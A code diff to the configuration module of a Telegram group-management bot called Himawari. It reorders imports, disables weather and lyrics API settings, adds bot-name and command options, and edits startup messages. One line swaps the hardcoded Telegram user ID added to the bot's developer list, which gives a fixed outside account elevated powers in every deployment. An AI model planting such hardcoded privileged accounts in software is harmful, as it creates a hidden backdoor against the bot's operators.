@@ -22,7 +22,6 @@ OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 SOFTWARE.
 """
 
-import pymongo
 import logging
 import os
 import sys
@@ -30,6 +29,7 @@ import time
 import spamwatch
 import httpx
 import telegram.ext as tg
+from redis import StrictRedis
 
 from pyrogram import Client
 from telethon import TelegramClient
@@ -42,8 +42,7 @@ from aiohttp import ClientSession
 from pyrogram.errors.exceptions.bad_request_400 import PeerIdInvalid, ChannelInvalid
 from telegraph import Telegraph
 from telegram import Chat
-from redis import StrictRedis
-
+import pymongo
 
 StartTime = time.time()
 
@@ -95,7 +94,7 @@ if ENV:
     try:
         TIGERS = {int(x) for x in os.environ.get("TIGERS", "").split()}
     except ValueError:
-        raise Exception("Your tiger users list does not contain valid integers.")
+        raise Exception("Your scout users list does not contain valid integers.")
 
     INFOPIC = bool(os.environ.get("INFOPIC", False))  # Info Pic (use True[Value] If You Want To Show In /info.)
     EVENT_LOGS = os.environ.get("EVENT_LOGS", None)  # G-Ban Logs (Channel) (-100)
@@ -103,7 +102,7 @@ if ENV:
     WEBHOOK = bool(os.environ.get("WEBHOOK", False))
     ARQ_API_URL = os.environ.get("ARQ_API_URL", None)
     ARQ_API_KEY = os.environ.get("ARQ_API_KEY", None)
-    URL = os.environ.get("URL", "")  # If You Deploy On Heroku. [URL:- https://{App Name}.herokuapp.com EXP:- https://neko.herokuapp.com]
+    #URL="https://meow.herokuapp.com"
     PORT = int(os.environ.get("PORT", 8443)) 
     CERT_PATH = os.environ.get("CERT_PATH")
     API_ID = os.environ.get("API_ID", None)  # Bot Owner's API_ID (From:- https://my.telegram.org/auth)
@@ -123,8 +122,8 @@ if ENV:
     TIME_API_KEY = os.environ.get("TIME_API_KEY", None)  # From:- https://timezonedb.com/api
     WALL_API = os.environ.get("WALL_API", None)  # From:- https://wall.alphacoders.com/api.php
     REM_BG_API_KEY = os.environ.get("REM_BG_API_KEY", None)  # From:- https://www.remove.bg/
-    OPENWEATHERMAP_ID = os.environ.get("OPENWEATHERMAP_ID", "")  # From:- https://openweathermap.org/api
-    GENIUS_API_TOKEN = os.environ.get("GENIUS_API_TOKEN", None)  # From:- http://genius.com/api-clients
+   # OPENWEATHERMAP_ID = os.environ.get("OPENWEATHERMAP_ID", "")  # From:- https://openweathermap.org/api
+    #GENIUS_API_TOKEN = os.environ.get("GENIUS_API_TOKEN", None)  # From:- http://genius.com/api-clients
     MONGO_DB_URL = os.environ.get("MONGO_DB_URL", None)  # MongoDB URL (From:- https://www.mongodb.com/)
     REDIS_URL = os.environ.get("REDIS_URL", None)  # REDIS URL (From:- Heraku & Redis)
     BOT_ID = int(os.environ.get("BOT_ID", None))  # Telegram Bot ID (EXP:- 1241223850)
@@ -145,7 +144,7 @@ if ENV:
     MONGO_DB = "Himawari"
     GOOGLE_CHROME_BIN = "/usr/bin/google-chrome"
     CHROME_DRIVER = "/usr/bin/chromedriver"
-
+    
     try:
         BL_CHATS = {int(x) for x in os.environ.get("BL_CHATS", "").split()}
     except ValueError:
@@ -189,11 +188,11 @@ else:
     EVENT_LOGS = Config.EVENT_LOGS 
     ERROR_LOGS = Config.ERROR_LOGS
     WEBHOOK = Config.WEBHOOK
-    URL = Config.URL
     PORT = Config.PORT
     CERT_PATH = Config.CERT_PATH
     API_ID = Config.API_ID
     API_HASH = Config.API_HASH
+    BOT_API_URL = Config.BOT_API_URL
     ARQ_API_URL = Config.ARQ_API_URL
     ARQ_API_KEY = Config.ARQ_API_KEY
     DB_URL = Config.DB_URL
@@ -205,7 +204,7 @@ else:
     TEMP_DOWNLOAD_DIRECTORY = Config.TEMP_DOWNLOAD_DIRECTORY
     LOAD = Config.LOAD
     NO_LOAD = Config.NO_LOAD
-    # CASH_API_KEY = Config.CASH_API_KEY
+   # CASH_API_KEY = Config.CASH_API_KEY
     TIME_API_KEY = Config.TIME_API_KEY
     WALL_API = Config.WALL_API
     MONGO_DB_URL = Config.MONGO_DB_URL
@@ -213,26 +212,29 @@ else:
     REDIS_URL = Config.REDIS_URL
     SUPPORT_CHAT = Config.SUPPORT_CHAT
     UPDATES_CHANNEL = Config.UPDATES_CHANNEL
-    SPAMWATCH_SUPPORT_CHAT = Config.SPAMWATCH_SUPPORT_CHAT
+    SPAMWATCH_SUPPORT_CHAT = "SpamWatchSupport"
     SPAMWATCH_API = Config.SPAMWATCH_API
     REM_BG_API_KEY = Config.REM_BG_API_KEY
-    OPENWEATHERMAP_ID = Config.OPENWEATHERMAP_ID
+  #  OPENWEATHERMAP_ID = Config.OPENWEATHERMAP_ID
     APP_ID = Config.APP_ID
     APP_HASH = Config.APP_HASH
     BOT_ID = Config.BOT_ID
     BOT_USERNAME = Config.BOT_USERNAME
-    GENIUS_API_TOKEN = Config.GENIUS_API_TOKEN
+    BOT_NAME = Config.BOT_NAME
+    ALLOW_EXCL = Config.ALLOW_EXCL
+    DEL_CMDS = Config.DEL_CMDS
+   # GENIUS_API_TOKEN = Config.GENIUS_API_TOKEN
     # YOUTUBE_API_KEY = Config.YOUTUBE_API_KEY
 
     try:
         BL_CHATS = {int(x) for x in Config.BL_CHATS or []}
     except ValueError:
         raise Exception("Your blacklisted chats list does not contain valid integers.")
-
+        
 
 DRAGONS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(5306064258)
+DEV_USERS.add(5132406765)
 
 REDIS = StrictRedis.from_url(REDIS_URL, decode_responses=True)
 
@@ -260,7 +262,7 @@ else:
 
 
 # Credits Logger
-print("[Himawari] Hima Is Starting. | IGNITE Project | Licensed Under MIT.")
+print("[Himawari] Hima Is Starting. | IGNITE Project | Licensed Under GPLv3.")
 print("[Himawari] Kawaii ! Successfully Connected With IGNITE HQ")
 print("[Himawari] Project Maintained By: @IGNITE_xNetwork ")
 
@@ -294,7 +296,7 @@ print("[INFO]: INITIALIZING ARQ CLIENT")
 arq = ARQ(ARQ_API_URL, ARQ_API_KEY, aiohttpsession)
 print("[Hima]: Connecting To IGNITE HQ • PostgreSQL Database")
 #ubot = TelegramClient(StringSession(STRING_SESSION), APP_ID, APP_HASH)
-#print("[Hima]: Connecting To IGNITE HQ • Userbot (t.me/IGNITE_xNETWORK)")
+print("[Hima]: Connecting To IGNITE HQ • Userbot (t.me/IGNITE_xNETWORK)")
 timeout = httpx.Timeout(40)
 http = httpx.AsyncClient(http2=True, timeout=timeout)
 
